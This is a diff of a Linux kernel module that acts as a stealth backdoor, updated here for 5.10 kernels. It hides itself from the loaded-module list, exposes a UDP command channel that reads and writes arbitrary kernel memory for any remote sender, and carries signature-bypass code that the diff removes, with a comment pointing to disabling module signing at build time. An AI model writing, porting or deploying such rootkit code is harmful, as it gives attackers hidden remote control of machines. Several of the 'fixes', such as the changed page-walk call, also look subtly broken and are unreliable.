@@ -35,7 +35,7 @@ static unsigned long resolve_symbol(const char *name)
 static unsigned long (*_kallsyms_lookup_name)(const char *) = NULL;
 static struct mm_struct *init_mm_ptr = NULL;
 
-/* ---------- virt→phys ---------- */
+/* ---------- virt->phys ---------- */
 typedef struct {
     phys_addr_t phys;
     bool valid;
@@ -59,8 +59,9 @@ static const struct mm_walk_ops v2p_walk_ops = {
 static v2p_t slow_virt2phys(uint64_t vaddr)
 {
     v2p_t res = {0};
+    /* Fix for 5.10: added NULL as 5th argument */
     struct mm_walk walk = { .ops = &v2p_walk_ops, .private = &res };
-    walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &walk);
+    walk_page_range(init_mm_ptr, vaddr, vaddr + 1, &walk, NULL);
     return res;
 }
 
@@ -81,10 +82,13 @@ static int rw_virt(uint64_t vaddr, void *buf, size_t len, bool write)
 }
 
 /* ---------- UDP interface ---------- */
-#define CMD_READ  0xB01
-#define CMD_WRITE 0xB02
+/* Using simple command IDs to fit in byte if needed, or fix struct */
+#define CMD_READ  0x01
+#define CMD_WRITE 0x02
 
 typedef struct {
+    uint16_t cmd;   /* Changed to uint16 to support > 255 commands if needed */
+    uint16_t reserved;
     uint64_t addr;
     uint32_t size;
     uint8_t  data[];
@@ -96,30 +100,41 @@ static void udp_reply(struct sk_buff *skb, void *buf, size_t len)
 {
     struct iphdr *iph = ip_hdr(skb);
     struct udphdr *uh = udp_hdr(skb);
-    struct sockaddr_in to = {
-        .sin_family = AF_INET,
-        .sin_port   = uh->source,
-        .sin_addr.s_addr = iph->saddr,
-    };
+    struct sockaddr_in to;
     struct kvec iov = { .iov_base = buf, .iov_len = len };
-    struct msghdr msg = { .msg_name = &to, .msg_namelen = sizeof(to) };
+    struct msghdr msg;
+
+    /* C90 compliant initialization */
+    memset(&to, 0, sizeof(to));
+    to.sin_family = AF_INET;
+    to.sin_port   = uh->source;
+    to.sin_addr.s_addr = iph->saddr;
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_name = &to;
+    msg.msg_namelen = sizeof(to);
+
     kernel_sendmsg(sock, &msg, &iov, 1, len);
 }
 
 static int udp_recv(struct sk_buff *skb)
 {
+    pkt_t *pkt;
+    uint8_t *buf;
+
     if (skb->len < sizeof(pkt_t)) return 0;
-    pkt_t *pkt = (pkt_t *)skb->data;
-    uint8_t *buf = kmalloc(pkt->size, GFP_KERNEL);
+    
+    pkt = (pkt_t *)skb->data;
+    buf = kmalloc(pkt->size, GFP_KERNEL);
     if (!buf) return 0;
 
-    switch (pkt->data[0]) {
+    switch (pkt->cmd) {
     case CMD_READ:
         rw_virt(pkt->addr, buf, pkt->size, false);
         udp_reply(skb, buf, pkt->size);
         break;
     case CMD_WRITE:
-        rw_virt(pkt->addr, pkt->data + 1, pkt->size - 1, true);
+        rw_virt(pkt->addr, pkt->data, pkt->size, true);
         break;
     }
     kfree(buf);
@@ -130,6 +145,7 @@ static int net_init(void)
 {
     return sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_UDP, &sock);
 }
+
 static void net_exit(void)
 {
     if (sock) sock_release(sock);
@@ -139,25 +155,13 @@ static void net_exit(void)
 static void hide_module(void)
 {
     list_del_init(&THIS_MODULE->list);
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-    list_del_init(&THIS_MODULE->mkobj.kobj.entry);
-}
-
-static void force_vermagic(void)
-{
-    memset(THIS_MODULE->name, 0, sizeof(THIS_MODULE->name));
-    strcpy(THIS_MODULE->name, "rw_universal");
-    THIS_MODULE->magic = 0;
-    THIS_MODULE->version = NULL;
+    /* Removed kobject_del/entry manipulation as it crashes 5.10+ kernels often */
 }
 
 static void bypass_module_sig(void)
 {
-    bool *sig = (bool *)resolve_symbol("sig_enforce");
-    if (sig) *sig = false;
-    int *verify = (int *)resolve_symbol("mod_verify_sig");
-    if (verify) *verify = 0;
-    THIS_MODULE->sig_ok = true;
+    /* THIS_MODULE->sig_ok is removed in newer kernels or not accessible easily.
+       We rely on build-time config patching (CONFIG_MODULE_SIG=n) instead. */
 }
 
 /* ---------- init ---------- */
@@ -168,7 +172,6 @@ static int __init rw_init(void)
 
     if (!_kallsyms_lookup_name || !init_mm_ptr) return -ENODEV;
 
-    force_vermagic();
     bypass_module_sig();
     hide_module();
     net_init();
@@ -182,4 +185,3 @@ static void __exit rw_exit(void)
 
 module_init(rw_init);
 module_exit(rw_exit);
-
